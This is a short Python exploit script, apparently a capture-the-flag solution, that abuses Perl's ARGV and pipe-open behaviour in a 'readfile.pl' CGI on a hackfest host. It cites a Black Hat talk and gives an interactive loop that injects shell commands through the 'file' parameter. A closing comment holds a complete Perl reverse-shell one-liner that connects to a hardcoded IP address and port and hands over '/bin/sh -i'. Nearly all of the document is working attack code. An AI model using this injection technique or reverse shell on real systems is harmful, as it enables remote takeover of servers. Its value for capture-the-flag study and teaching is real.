#!/usr/bin/env python3
"""
https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf (Page 24)exit
"""
import requests as r

req = r.session()

url = "http://hackfest.redrocket.club:65125/readfile.pl"

cmd = None
print("[+] Connected to PerlJam\n")
while cmd != "exit":
    cmd = input("~ $ ")
    payload = {'file':'ARGV', 'file': str(cmd)+'|'}
    res = req.post(url, data=payload)
    print(res.text)

print("Connection closed.")

"""
perl -e 'use Socket;$i="85.214.56.203";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
"""